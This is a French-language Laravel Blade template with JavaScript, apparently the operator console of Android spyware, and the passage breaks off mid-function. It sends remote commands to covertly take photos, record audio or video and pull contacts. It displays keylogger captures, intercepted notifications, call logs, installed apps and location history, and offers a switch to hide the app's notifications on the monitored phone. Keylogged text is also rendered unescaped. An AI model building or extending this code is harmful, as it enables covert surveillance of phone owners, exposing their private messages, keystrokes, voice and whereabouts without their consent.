@extends('layouts.main')
@section('title', 'Controle à distance')

@section('body')
    <x-sidebar />
    <x-nav />

    <div class="mdb-page-content page-intro bg-white">
        <div class="container py-3 ">
            <div class="row">
                <div class="col-md-12 mt-5">
                    <div class="card shadow-lg mb-3 mt-5" style="border-radius: 20px; background-color: whitesmoke;">
                        <div class="card-body">
                            <div class="row">
                                <div class="col-md-3">
                                    <div class="mb-2" style="font-size: 12px">
                                        <h4 class="font-weight-bold text-dark"><i class="fa fa-money-bill"></i>
                                            Abonnement
                                        </h4>
                                        <div class="mt-2" divab>
                                            <div class="d-flex justify-content-between">
                                                <b>Téléphone : </b>
                                                <b abphone></b>
                                            </div>
                                            <div class="d-flex justify-content-between" abphonename>
                                            </div>
                                            <div class="d-flex justify-content-between">
                                                <b>Status abonnement : </b>
                                                <b abstatus></b>
                                            </div>
                                            <div class="d-flex justify-content-between">
                                                <b>Type abonnement : </b>
                                                <b abtype></b>
                                            </div>
                                            <div class="d-flex justify-content-between">
                                                <b>Expire au : </b>
                                                <b abto></b>
                                            </div>
                                            <div class="d-flex justify-content-between">
                                                <b>Jours restants : </b>
                                                <b abdl></b>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-3">
                                </div>
                                <div class="col-md-6">
                                    <div class="row no-gutters">
                                        <div class="col">
                                            <div class="mb-2">
                                                <b>Client</b> <br>
                                                <select id="user" class="form-control form-control-sm select2 input"
                                                    style="width: 100%">
                                                    @foreach ($users as $el)
                                                        <option value="{{ $el->id }}">{{ $el->name }}</option>
                                                    @endforeach
                                                </select>
                                            </div>
                                        </div>
                                        <div class="col">
                                            <div class="mb-2">
                                                <b>Téléphone</b> <br>
                                                <select name="phone_id" class="form-control form-control-sm select2 input"
                                                    style="width: 100%">

                                                </select>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="card mb-3 shadow-md">
                        <div class="card-header">
                            <h4 class="font-weight-bold m-0"> <i class="fa fa-phone"></i> <span phonename></span> </h4>
                        </div>
                        <div class="card-body">
                            <p class="m-1">
                                <i class="fa fa-check-circle"></i> Date synchronisation : <span updatedon></span>
                            </p>
                            <p class="m-1">
                                <i class="fa fa-leaf"></i> Version App : <span appversion></span>
                            </p>
                            <p class="m-1">
                                <i class="fa fa-battery"></i> Batterie : <span battery></span>
                            </p>
                            <p class="m-1">
                                <i class="fa fa-mobile-android-alt"></i> Android : <span android_version></span>
                            </p>
                            <p class="m-1"><i class="fa fa-refresh"></i> FCM : <span fcm></span> </p>
                            <p class="m-1"><i class="fa fa-check-circle"></i> Permissions : <span perms></span> </p>
                            <hr>
                            <h5 class="font-weight-bold">Configuration</h5>
                            <div class="">
                                <div class="form-check form-switch mb-3">
                                    <label class="form-check-label" for="flexSwitchCheckDefault">
                                        Masquer toutes les notifications
                                    </label>
                                    <input class="form-check-input input" type="checkbox" id="flexSwitchCheckDefault"
                                        configbtn="maskall" />
                                </div>
                            </div>
                            <div hoverzone>
                                <div class="d-flex flex-column flex-sm-row flex-wrap mb-2">
                                    <div class="mb-2 mb-sm-0 mr-sm-2">
                                        <span>Masquer les notification pour : </span> <br>
                                        <select id="phoneapps2" multiple class="form-control form-control-sm select2 input"
                                            style="width: 100%;">
                                        </select>
                                    </div>
                                </div>
                                <div class="alert" id="rep0" style="display: none"></div>
                                <div class="">
                                    <button class="btn btn-sm app-btn input mt-2 btn-rounded" configbtn="maskpartial">
                                        <i class="fa fa-save"></i>
                                        Enregistrer
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="card mb-3 shadow-md">
                        <div class="card-header">
                            <h4 class="font-weight-bold"> <i class="fa fa-wifi"></i> Contrôle à distance</h4>
                        </div>
                        <div class="card-body">
                            <p class="text-muted">
                                <i class="fa fa-info-circle"></i>
                                Utiliser la fonctionnalité « Contrôle à distance » pour envoyer les commandes à votre
                                téléphone et récupérer les résultats.
                            </p>
                            <div class="row">
                                <div class="col-md-3 col-lg-3 col-md-6">
                                    <form action="#" f-action>
                                        <div class="card shadow-lg mb-3">
                                            <div class="card-body d-flex flex-column" style="min-height: 240px">
                                                <b><i class="fa fa-camera-alt"></i> Prendre une photo</b>
                                                <div class="flex-fill d-flex align-items-center">
                                                    <div class="">
                                                        <div class="form-check form-check-inline">
                                                            <input class="form-check-input" type="radio" name="camera"
                                                                id="inlineRadiop0" value="1" checked />
                                                            <label class="form-check-label" for="inlineRadiop0">
                                                                Caméra Avant</label>
                                                        </div>
                                                        <div class="form-check form-check-inline">
                                                            <input class="form-check-input" type="radio" name="camera"
                                                                id="inlineRadipv01" value="0" />
                                                            <label class="form-check-label" for="inlineRadipv01">Caméra
                                                                Arrière</label>
                                                        </div>
                                                        <div class="mt-2 mb-2">
                                                            <div class="form-check">
                                                                <input class="form-check-input" type="checkbox"
                                                                    name="flash" id="checkboxExample">
                                                                <label class="form-check-label" for="checkboxExample">
                                                                    Utiliser le flash
                                                                </label>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="alert" style="display: none;padding: 5px;" id="repaction">
                                                </div>
                                                <input type="hidden" name="action" value="photo">
                                                <button class="btn btn-sm app-btn input btn-block btn-rounded mt-3">
                                                    <i class="fa fa-envelope"></i>
                                                    Envoyer
                                                </button>
                                            </div>
                                        </div>
                                    </form>
                                </div>
                                <div class="col-md-3 col-lg-3 col-md-6">
                                    <form action="#" f-action>
                                        <div class="card shadow-lg mb-3">
                                            <div class="card-body d-flex flex-column" style="min-height: 240px">
                                                <b><i class="fa fa-microphone"></i> Enregistrer un audio</b>
                                                <div class="flex-fill d-flex align-items-center">
                                                    <div class="w-100">
                                                        <span>Durée de l'audio</span><br>
                                                        <select class="select2" name="minute" style="width: 100%;">
                                                            <option value="1">1 minute</option>
                                                            <option value="3">3 minutes</option>
                                                            <option value="5">5 minutes</option>
                                                            <option value="10">10 minutes</option>
                                                            <option value="20">20 minutes</option>
                                                        </select>
                                                    </div>
                                                </div>
                                                <div class="alert" style="display: none;padding: 5px;" id="repaction">
                                                </div>
                                                <input type="hidden" name="action" value="audio">
                                                <button class="btn btn-sm app-btn input btn-block btn-rounded mt-3">
                                                    <i class="fa fa-envelope"></i>
                                                    Envoyer
                                                </button>
                                            </div>
                                        </div>
                                    </form>
                                </div>
                                <div class="col-md-3 col-lg-3 col-md-6">
                                    <form action="#" f-action>
                                        <div class="card shadow-lg mb-3">
                                            <div class="card-body d-flex flex-column" style="min-height: 240px">
                                                <b><i class="fa fa-video"></i> Enregistrer une vidéo</b>
                                                <div class="flex-fill d-flex align-items-center">
                                                    <div class="">
                                                        <div class="form-check form-check-inline">
                                                            <input class="form-check-input" type="radio" name="camera"
                                                                id="inlineRadiov0" value="1" checked />
                                                            <label class="form-check-label" for="inlineRadiov0">
                                                                Caméra Avant</label>
                                                        </div>
                                                        <div class="form-check form-check-inline">
                                                            <input class="form-check-input" type="radio" name="camera"
                                                                id="inlineRadiov01" value="0" />
                                                            <label class="form-check-label" for="inlineRadiov01">Caméra
                                                                Arrière</label>
                                                        </div>
                                                        <div class="mt-2 mb-2">
                                                            <span>Durée de la vidéo</span><br>
                                                            <select class="select2" name="minute" style="width: 100%;">
                                                                <option value="1">1 minute</option>
                                                                <option value="3">3 minutes</option>
                                                                <option value="5">5 minutes</option>
                                                                <option value="10">10 minutes</option>
                                                                <option value="20">20 minutes</option>
                                                            </select>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="alert" style="display: none;padding: 5px;" id="repaction">
                                                </div>
                                                <input type="hidden" name="action" value="video">
                                                <button class="btn btn-sm app-btn input btn-block btn-rounded mt-3">
                                                    <i class="fa fa-envelope"></i>
                                                    Envoyer
                                                </button>
                                            </div>
                                        </div>
                                    </form>
                                </div>
                                <div class="col-md-3 col-lg-3 col-md-6">
                                    <form action="#" f-action>
                                        <div class="card shadow-lg mb-3">
                                            <div class="card-body d-flex flex-column" style="min-height: 240px">
                                                <b><i class="fa fa-contact-book"></i> Récupérer les contacts</b>
                                                <div class="flex-fill d-flex text-center align-items-center">
                                                    <p>
                                                        <i class="fa fa-info-circle"></i>
                                                        Utilisez cette commande pour récupérer la liste de tous les contacts
                                                        du
                                                        téléphone.
                                                    </p>
                                                </div>
                                                <input type="hidden" name="action" value="c">
                                                <div class="alert" style="display: none;padding: 5px;" id="repaction">
                                                </div>
                                                <button class="btn btn-sm app-btn input btn-block btn-rounded mt-3">
                                                    <i class="fa fa-envelope"></i>
                                                    Envoyer
                                                </button>
                                            </div>
                                        </div>
                                    </form>
                                </div>
                                <div class="col-md-3 col-lg-3 col-md-6">
                                    <form action="#" f-action>
                                        <div class="card shadow-lg mb-3">
                                            <div class="card-body d-flex flex-column" style="min-height: 240px">
                                                <b><i class="fa fa-info-circle"></i> Push</b>
                                                <div class="flex-fill d-flex align-items-center">
                                                    <div class="form-outline w-100">
                                                        <input name="push" id="form1Example2" class="form-control" />
                                                        <label class="form-label" for="form1Example2">
                                                            Action (Ex: 1001.infoset)
                                                        </label>
                                                    </div>
                                                </div>
                                                <input type="hidden" name="action" value="push">
                                                <div class="alert" style="display: none;padding: 5px;" id="repaction">
                                                </div>
                                                <button class="btn btn-sm app-btn input btn-block btn-rounded mt-3">
                                                    <i class="fa fa-envelope"></i>
                                                    Envoyer
                                                </button>
                                            </div>
                                        </div>
                                    </form>
                                </div>
                            </div>
                            <div class="col-12">
                                <h4 class="font-weight-bold mb-2 mt-5"> <i class="fa fa-sync"></i> Resultats des commandes
                                </h4>
                                <p class="text-muted mb-5">
                                    <i class="fa fa-info-circle"></i>
                                    Les résultats de vos commandes s'afficheront ici avec leurs états
                                </p>
                                <div class="table-responsive">
                                    <x-error />
                                    <table tresult class="table table-sm table-condensed table-hover table-striped"
                                        style="width: 100%">
                                        <thead>
                                            <th>ID</th>
                                            <th>Action</th>
                                            <th>Etat</th>
                                            <th>Date</th>
                                            <th>Resultat</th>
                                        </thead>
                                        <tbody></tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="card mb-3 shadow-md">
                        <div class="card-header">
                            <div class="d-flex flex-wrap justify-content-between align-items-center">
                                <h4 class="font-weight-bold text-nowrap"> <i class="fa fa-bell"></i> Notifications</h4>
                                <div class="d-flex flex-column flex-sm-row flex-wrap">
                                    <div class="mb-2 mb-sm-0 mr-sm-2">
                                        <span>Apps</span> <br>
                                        <select id="phoneapps" multiple
                                            class="form-control form-control-sm select2 input notif-input"
                                            style="width: 100%;">
                                        </select>
                                    </div>
                                    <div class="mb-2 mb-sm-0 mr-sm-2">
                                        <span>Date</span>
                                        <input type="text"
                                            class="form-control form-control-sm flatpicker input notif-input"
                                            id="notificationdate" value="{{ date('Y-m-d') }}">
                                    </div>
                                </div>
                            </div>
                            <p class="text-muted mb-2">
                                <i class="fa fa-info-circle"></i>
                                Toutes les notifications capturées par l'application seront enregistrées ici.
                            </p>
                        </div>
                        <div class="card-body">
                            <div class="table-responsive">
                                <x-error />
                                <table tnotif class="table table-sm table-condensed table-hover table-striped"
                                    style="width: 100%">
                                    <thead>
                                        <th>ID</th>
                                        <th>App</th>
                                        <th>Titre</th>
                                        <th>Notification</th>
                                        <th>Date</th>
                                    </thead>
                                    <tbody></tbody>
                                </table>
                            </div>
                        </div>
                    </div>

                    <div class="card mb-3 shadow-md">
                        <div class="card-header">
                            <div class="d-flex flex-wrap justify-content-between align-items-center">
                                <h4 class="font-weight-bold"> <i class="fa fa-keyboard"></i> Key logger</h4>
                                <div class="d-flex flex-column flex-sm-row flex-wrap">
                                    <div class="mb-2 mb-sm-0 mr-sm-2">
                                        <span>Date</span>
                                        <input type="text" class="form-control form-control-sm flatpicker input"
                                            id="keyloggerdate" value="{{ date('Y-m-d') }}">
                                    </div>
                                </div>
                            </div>
                            <p class="text-muted mb-2 mt-1">
                                <i class="fa fa-info-circle"></i>
                                Tous les textes saisis dans les champs des formulaires de certaines applications
                                s'afficheront ici et même certains textes des fenêtres des applications ouvertes.
                            </p>
                        </div>
                        <div class="card-body">
                            <div class="table-responsive">
                                <x-error />
                                <table tkeylogger class="table table-sm table-condensed table-hover table-striped"
                                    style="width: 100%">
                                    <thead>
                                        <th>ID</th>
                                        <th>App</th>
                                        <th>Text</th>
                                        <th>Date</th>
                                        <th></th>
                                    </thead>
                                    <tbody></tbody>
                                </table>
                            </div>
                        </div>
                    </div>

                    <div class="card mb-3 shadow-md">
                        <div class="card-header ">
                            <div class="d-flex flex-wrap justify-content-between align-items-center">
                                <h4 class="font-weight-bold"> <i class="fa fa-phone-square"></i> Appels</h4>
                                <div class="d-flex flex-column flex-sm-row flex-wrap">
                                    <div class="mb-2 mb-sm-0 mr-sm-2">
                                        <span>Date</span>
                                        <input type="text" class="form-control form-control-sm flatpicker input"
                                            id="calldate" value="{{ date('Y-m-d') }}">
                                    </div>
                                </div>
                            </div>
                            <p class="text-muted mb-2">
                                <i class="fa fa-info-circle"></i>
                                L'historique de tous les appels
                            </p>
                        </div>
                        <div class="card-body">
                            <div class="table-responsive">
                                <x-error />
                                <table tcalls class="table table-sm table-condensed table-hover table-striped"
                                    style="width: 100%">
                                    <thead>
                                        <th>ID</th>
                                        <th>Type</th>
                                        <th>Nom</th>
                                        <th>Numero</th>
                                        <th>Temps</th>
                                        <th>Date</th>
                                    </thead>
                                    <tbody></tbody>
                                </table>
                            </div>
                        </div>
                    </div>

                    <div class="card mb-3 shadow-md">
                        <div class="card-header">
                            <h4 class="font-weight-bold"> <i class="fa fa-list-ul"></i> Apps</h4>
                            <p class="text-muted mb-2">
                                <i class="fa fa-info-circle"></i>
                                La liste d'applications installées sur le téléphone
                            </p>
                        </div>
                        <div class="card-body">
                            <div class="table-responsive">
                                <x-error />
                                <table tapps class="table table-sm table-condensed table-hover table-striped"
                                    style="width: 100%">
                                    <thead>
                                        <th>ID</th>
                                        <th>App</th>
                                        <th>Package</th>
                                        <th>Date installation</th>
                                        <th>Etat</th>
                                    </thead>
                                    <tbody></tbody>
                                </table>
                            </div>
                        </div>
                    </div>

                    <div class="card mb-3 shadow-md">
                        <div class="card-header ">
                            <div class="d-flex flex-wrap justify-content-between align-items-center">
                                <h4 class="font-weight-bold"> <i class="fa fa-map-location"></i> Localisation</h4>
                                <div class="d-flex flex-column flex-sm-row flex-wrap">
                                    <div class="mb-2 mb-sm-0 mr-sm-2">
                                        <span>Date</span>
                                        <input type="text" class="form-control form-control-sm flatpicker input"
                                            id="locationdate" value="{{ date('Y-m-d') }}">
                                    </div>
                                </div>
                            </div>
                            <p class="text-muted mb-2">
                                <i class="fa fa-info-circle"></i>
                                L'historique de localisation
                            </p>
                        </div>
                        <div class="card-body">
                            <div id="map" class="m-2 rounded-lg"></div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
        <x-footer />

        <div class="modal fade" id="minfo" tabindex="-1" aria-hidden="true">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title text-dark font-weight-bold">Key logger : <span appname></span> </h5>
                        <i class="fa fa-times text-muted fa-2x" data-dismiss="modal" style="cursor: pointer"></i>
                    </div>
                    <div class="modal-body" style="max-height: 60vh; overflow:auto;">

                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-dark btn-sm" data-dismiss="modal">Fermer</button>
                    </div>
                </div>
            </div>
        </div>

    @endsection

    @section('js-code')
        @include('files.datatable-js')
        @include('files.flatpickr')
        @include('files.select')

        <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
            integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin="" />
        <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
            integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin=""></script>
        <link rel="stylesheet" href="https://unpkg.com/leaflet-gesture-handling/dist/leaflet-gesture-handling.min.css">
        <script src="https://unpkg.com/leaflet-gesture-handling"></script>
        <link rel="stylesheet" href="https://unpkg.com/leaflet.fullscreen/Control.FullScreen.css" />
        <script src="https://unpkg.com/leaflet.fullscreen/Control.FullScreen.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/leaflet-polylinedecorator@1.6.0/dist/leaflet.polylineDecorator.min.js">
        </script>

        <style>
            #map {
                height: 400px;
            }

            .select2-container .select2-selection--multiple {
                min-width: 200px;
            }

            .ellipsis {
                white-space: nowrap;
                overflow: hidden;
                text-overflow: ellipsis;
                max-width: 200px;
                cursor: pointer;
            }
        </style>
        <script>
            $(function() {
                var mindate = "{{ now()->subDays(7)->format('Y-m-d') }}";
                flatpickr(".flatpicker", {
                    mode: "range",
                    minDate: mindate,
                    maxDate: "today",
                    locale: {
                        firstDayOfWeek: 1
                    }
                });
                $('.select2').select2({
                    minimumResultsForSearch: Infinity
                });

                var usersel = $('#user');
                var phonesel = $('[name="phone_id"]');

                $('.notif-input').change(function() {
                    dtNotif.ajax.reload(null, false);
                });

                var keyloggerdate = $('#keyloggerdate');
                keyloggerdate.change(function() {
                    dtKeylogger.ajax.reload(null, false);
                });

                var calldate = $('#calldate');
                calldate.change(function() {
                    dtCalls.ajax.reload(null, false);
                });

                var locationdate = $('#locationdate');
                locationdate.change(function() {
                    location(false);
                });

                usersel.change(function() {
                    getphones();
                });
                phonesel.change(function() {
                    getphoneapps();
                });

                function reloadAll() {
                    dtResult.ajax.reload(null, false);
                    dtNotif.ajax.reload(null, false);
                    dtKeylogger.ajax.reload(null, false);
                    dtCalls.ajax.reload(null, false);
                    dtApps.ajax.reload(null, false);
                }

                function phoneStatus(phone, force = false) {
                    if (!phone) return;
                    $('[updatedon]').html(phone.updatedon);
                    $('[appversion]').html(phone.data.appversion);
                    var sn = phone.name ?
                        `<br/><small style='font-size:12px'><i class='fa fa-user-alt'></i> ${phone.name}</small>` : '';
                    $('[phonename]').html(phone.phone + sn);
                    $('[battery]').html(phone.data.battery);
                    $('[android_version]').html(phone.data.android_version);
                    $('[fcm]').html(phone.fcm ? "<i class='fa fa-check-circle text-success'></i>" :
                        "<i class='text-danger fa fa-times-circle'></i>");
                    var perms = Object.keys(phone.perms);
                    var p = [];
                    perms.forEach(e => {
                        p.push(
                            `${e} : ${phone.perms[e] ?  "<i class='fa fa-check-circle text-success'></i>" :"<i class='text-danger fa fa-times-circle'></i>"}`
                        );
                    });
                    $('[perms]').html(p.join(' | '));
                    var conf = phone.config;
                    var inp = $('#flexSwitchCheckDefault');
                    var hnf = $('#phoneapps2');
                    inp[0].checked = !!conf.hidenotifications;

                    var hoverzone = $('[hoverzone]');
                    var ignore = hoverzone[0].matches(':hover') || $('.select2-container--open', hoverzone).length > 0;
                    if (force) {
                        hnf.val(conf.hidenotificationfor).change();
                    } else if (!ignore) {
                        hnf.val(conf.hidenotificationfor).change();
                    }

                    var subscription = phone.subscription;
                    var as = subscription.active ?
                        '<span class="badge bg-success"><i class="fa fa-check-circle"></i> ACTIF</span>' :
                        '<span class="badge bg-danger"><i class="fa fa-ban"></i> NON ACTIF</span>';
                    $('[abstatus]').html(as);
                    $('[abphone]').html(subscription.phone);
                    $('[abphonename]').html('');
                    if (subscription.phonename) {
                        $('[abphonename]').html(`<b>Nom téléphone :</b><b>${subscription.phonename}</b>`);
                    }
                    $('[abtype]').html(subscription.type);
                    $('[abto]').html(subscription.to);
                    $('[abdl]').html(subscription.daysleft);
                }

                function getphones() {
                    usersel.attr('disabled', true);
                    phonesel.attr('disabled', true);
                    $.ajax({
                        url: '{{ route('phone.index') }}',
                        data: {
                            user_id: usersel.val()
                        },
                        success: function(data) {
                            var txt = '';
                            data.forEach(e => {
                                txt += `<option value="${e.id}">${e.phone}</option>`;
                            });
                            phonesel.select2('destroy');
                            phonesel.html(txt);
                            phonesel.select2({
                                minimumResultsForSearch: Infinity
                            });
                            getphoneapps();
                        },
                        error: function() {
                            setTimeout(() => {
                                getphones();
                            }, 1000);
                        }
                    }).always(function() {});
                }
                getphones();

                function getphoneapps() {
                    $('.input').attr('disabled', true);
                    $.ajax({
                        url: '{{ route('phoneapps') }}',
                        data: {
                            phone_id: phonesel.val()
                        },
                        success: function(phone) {
                            var txt = '';
                            var txt2 = '';
                            phone.apps.forEach(e => {
                                txt += `<option value="${e.id}">${e.name}</option>`;
                                txt2 += `<option value="${e.package}">${e.name}</option>`;
                            });
                            var sel = $('#phoneapps');
                            sel.select2('destroy');
                            sel.html(txt);
                            sel.select2({
                                // minimumResultsForSearch: Infinity,
                                closeOnSelect: false,
                                allowClear: true
                            });

                            sel = $('#phoneapps2');
                            sel.select2('destroy');
                            sel.html(txt2);
                            sel.select2({
                                // minimumResultsForSearch: Infinity,
                                closeOnSelect: false,
                                allowClear: true,
                                placeholder: "Selectionnez une application"
                            });
                            phoneStatus(phone, true);
                            reloadAll();
                        },
                        error: function() {
                            setTimeout(() => {
                                getphoneapps();
                            }, 3000);
                        }
                    }).always(function() {
                        $('.input').attr('disabled', false);
                    });
                }

                $('[configbtn]').on("click", function() {
                    var c = $(this).attr('configbtn');
                    if (c == 'maskall') {
                        var data = {
                            maskall: this.checked
                        };
                    } else if (c == 'maskpartial') {
                        var data = {
                            maskfor: $('#phoneapps2').val()
                        };
                    } else {
                        return alert('?');
                    }
                    var pid = phonesel.val();
                    var rep0 = $('#rep0');
                    rep0.stop().slideUp();
                    $('.input').attr('disabled', true);
                    $.ajax({
                        url: '{{ route('phone.update', '') }}/' + pid,
                        type: 'put',
                        contentType: 'application/json',
                        data: JSON.stringify(data),
                        success: function(data) {
                            if (data.success) {
                                getphoneapps();
                                rep0.html(`<b>${data.message}</b>`).stop().removeClass(
                                        'alert-danger').addClass('alert-success')
                                    .slideDown();
                            } else {
                                rep0.html(`<b>${data.message}</b>`).stop().removeClass(
                                        'alert-success').addClass('alert-danger')
                                    .slideDown();
                            }
                            setTimeout(() => {
                                rep0.stop().slideUp();
                            }, 3000);
                        },
                        error: function() {
                            rep0.html(`<b>Erreur, veuillez réessayer.</b>`).stop().removeClass(
                                    'alert-success').addClass('alert-danger')
                                .slideDown();
                        }
                    }).always(function() {
                        $('.input').attr('disabled', false);
                    });
                })

                var dtResult = (new DataTable('[tresult]', {
                    searching: false,
                    lengthMenu: [
                        [10, 25, 50, 100, -1],
                        [10, 25, 50, 100, "All"]
                    ],
                    processing: true,
                    serverSide: true,
                    ajax: {
                        url: "{{ route('remotecontol.index', ['datatable' => '']) }}",
                        data: function(data) {
                            data.type = "result";
                            data.phone_id = phonesel.val();
                        },
                        dataSrc: function(json) {
                            phoneStatus(json.phone);
                            return json.data;
                        }
                    },
                    preDrawCallback: function(settings) {
                        // $('body').find('.tooltip').remove();
                    },
                    drawCallback: function(settings) {
                        // $('[tooltip]').popover({
                        //     html: true
                        // });
                    },
                    order: [
                        [0, "desc"]
                    ],
                    columnDefs: [{
                            targets: 0,
                            width: '1%'
                        },
                        {
                            targets: 4,
                            width: '1%'
                        },
                    ],
                    columns: [{
                            data: 'id',
                            name: 'id'
                        },
                        {
                            data: 'actionname',
                            name: 'actionname',
                            searchable: false,
                            orderable: false,
                        },
                        {
                            data: 'success',
                            name: 'success',
                            searchable: false,
                            orderable: false,
                        },
                        {
                            data: 'date',
                            name: 'date',
                            class: 'text-nowrap'
                        },
                        {
                            data: 'result',
                            name: 'result',
                            searchable: false,
                            orderable: false,
                            class: 'text-nowrap text-right'
                        },
                    ]
                }));

                /////////////
                var dtNotif = (new DataTable('[tnotif]', {
                    lengthMenu: [
                        [10, 25, 50, 100, -1],
                        [10, 25, 50, 100, "All"]
                    ],
                    processing: true,
                    serverSide: true,
                    ajax: {
                        url: "{{ route('remotecontol.index', ['datatable' => '']) }}",
                        data: function(data) {
                            data.type = "notif";
                            data.phone_id = phonesel.val();
                            data.phoneapps = JSON.stringify($('#phoneapps').val());
                            data.notificationdate = $('#notificationdate').val();
                        },
                    },
                    order: [
                        [0, "desc"]
                    ],
                    columnDefs: [{
                            targets: 0,
                            width: '1%'
                        },
                        {
                            targets: 4,
                            width: '1%'
                        },
                    ],
                    columns: [{
                            data: 'id',
                            name: 'id'
                        },
                        {
                            data: 'appname',
                            name: 'appname',
                        },
                        {
                            data: 'title',
                            name: 'title',
                        },
                        {
                            data: 'body',
                            name: 'body',
                        },
                        {
                            data: 'date',
                            name: 'date',
                            class: 'text-nowrap text-right'
                        },
                    ]
                }));


                /////////////
                var dtKeylogger = (new DataTable('[tkeylogger]', {
                    // dom: 'Bfrtip',
                    // buttons: [
                    //     'pageLength', 'excel', 'pdf', 'print'
                    // ],
                    lengthMenu: [
                        [10, 25, 50, 100, -1],
                        [10, 25, 50, 100, "All"]
                    ],
                    processing: true,
                    serverSide: true,
                    ajax: {
                        url: "{{ route('remotecontol.index', ['datatable' => '']) }}",
                        data: function(data) {
                            data.type = "keylog";
                            data.phone_id = phonesel.val();
                            data.keyloggerdate = keyloggerdate.val();
                        },
                    },
                    order: [
                        [0, "desc"]
                    ],
                    columnDefs: [{
                            targets: 0,
                            width: '1%'
                        },
                        {
                            targets: 1,
                            width: '1%'
                        },
                        {
                            targets: 2,
                            className: 'ellipsis',
                        },
                        {
                            targets: 3,
                            width: '1%'
                        },
                    ],
                    columns: [{
                            data: 'id',
                            name: 'id'
                        },
                        {
                            data: 'appname',
                            name: 'appname',
                        },
                        {
                            data: 'text',
                            name: 'text',
                        },
                        {
                            data: 'date',
                            name: 'date',
                            class: 'text-nowrap text-right'
                        },
                        {
                            data: 'text0',
                            name: 'text0',
                            visible: false,
                        },
                    ]
                }));

                $('[tkeylogger] tbody').on('click', 'tr', function() {
                    var data = dtKeylogger.row(this).data();
                    var text0 = data.text0;
                    var tb = text0.split('@');
                    var app = tb[0] ?? '-';
                    tb.shift();
                    var txt = tb.join('');
                    var mdl = $('#minfo');
                    $('span[appname]', mdl).html(app);
                    $('.modal-body', mdl).html(txt);
                    new mdb.Modal(mdl[0], {
                        backdrop: 'static',
                    }).show();
                });

                /////////////
                var dtCalls = (new DataTable('[tcalls]', {
                    lengthMenu: [
                        [10, 25, 50, 100, -1],
                        [10, 25, 50, 100, "All"]
                    ],
                    processing: true,
                    serverSide: true,
                    ajax: {
                        url: "{{ route('remotecontol.index', ['datatable' => '']) }}",
                        data: function(data) {
                            data.type = "calls";
                            data.phone_id = phonesel.val();
                            data.calldate = calldate.val();
                        },
                    },
                    order: [
                        [0, "desc"]
                    ],
                    columnDefs: [{
                            targets: 0,
                            width: '1%'
                        },
                        {
                            targets: 4,
                            width: '1%'
                        },
                    ],
                    columns: [{
                            data: 'id',
                            name: 'id'
                        },
                        {
                            data: 'type',
                            name: 'type',
                        },
                        {
                            data: 'name',
                            name: 'name',
                        },
                        {
                            data: 'number',
                            name: 'number',
                        },
                        {
                            data: 'duration',
                            name: 'duration',
                        },
                        {
                            data: 'date',
                            name: 'date',
                            class: 'text-nowrap text-right'
                        },
                    ]
                }));


                /////////////
                var dtApps = (new DataTable('[tapps]', {
                    lengthMenu: [
                        [10, 25, 50, 100, -1],
                        [10, 25, 50, 100, "All"]
                    ],
                    processing: true,
                    serverSide: true,
                    ajax: {
                        url: "{{ route('remotecontol.index', ['datatable' => '']) }}",
                        data: function(data) {
                            data.type = "apps";
                            data.phone_id = phonesel.val();
                        },
                    },
                    order: [
                        [1, "asc"]
                    ],
                    columnDefs: [{
                            targets: 0,
                            width: '1%'
                        },
                        {
                            targets: 4,
                            width: '1%'
                        },
                    ],
                    columns: [{
                            data: 'id',
                            name: 'id'
                        },
                        {
                            data: 'name',
                            name: 'name',
                        },
                        {
                            data: 'package',
                            name: 'package',
                        },
                        {
                            data: 'installdate',
                            name: 'installdate',
                        },
                        {
                            data: 'is_uninstalled',
                            name: 'is_uninstalled',
                        },
                    ]
                }));

                function startWatch() {
                    let isDtResultInprogress = false;
                    setInterval(async () => {
                        if (isDtResultInprogress) return;
                        isDtResultInprogress = true;
                        var e = $('[tresult]').closest('.dataTables_wrapper').find(
                            '.dataTables_processing');
                        e.css('visibility', 'hidden');
                        try {
                            await new Promise((resolve, reject) => {
                                dtResult.ajax.reload(function(json) {
                                    resolve(json);
                                }, false);
                            });
                        } catch (error) {}
                        isDtResultInprogress = false;
                        e.css('visibility', 'visible');
                    }, 3000);

                    let isDtNotifInprogress = false;
                    setInterval(async () => {
                        if (isDtNotifInprogress) return;
                        isDtNotifInprogress = true;

                        const processingEl = $('[tnotif]').closest('.dataTables_wrapper').find(
                            '.dataTables_processing');
                        processingEl.css('visibility', 'hidden');

                        try {
                            await new Promise((resolve, reject) => {
                                dtNotif.ajax.reload(function(json) {
                                    resolve(json);
                                }, false);
                            });
                        } catch (error) {}

                        processingEl.css('visibility', 'visible');
                        isDtNotifInprogress = false;
                    }, 3000);

                    let isDtKeyloggerInprogress = false;
                    setInterval(async () => {
                        if (isDtKeyloggerInprogress) return;
                        isDtKeyloggerInprogress = true;

                        const processingEl = $('[tkeylogger]').closest('.dataTables_wrapper').find(
                            '.dataTables_processing');
                        processingEl.css('visibility', 'hidden');

                        try {
                            await new Promise((resolve, reject) => {
                                dtKeylogger.ajax.reload(function(json) {
                                    resolve(json);
                                }, false);
                            });
                        } catch (error) {}

                        processingEl.css('visibility', 'visible');
                        isDtKeyloggerInprogress = false;
                    }, 3000);

                    let isDtCallsInprogress = false;
                    setInterval(async () => {
                        if (isDtCallsInprogress) return;
                        isDtCallsInprogress = true;

                        const processingEl = $('[tcalls]').closest('.dataTables_wrapper').find(
                            '.dataTables_processing');
                        processingEl.css('visibility', 'hidden');

                        try {
                            await new Promise((resolve, reject) => {
                                dtCalls.ajax.reload(function(json) {
                                    resolve(json);
                                }, false);
                            });
                        } catch (error) {}

                        processingEl.css('visibility', 'visible');
                        isDtCallsInprogress = false;
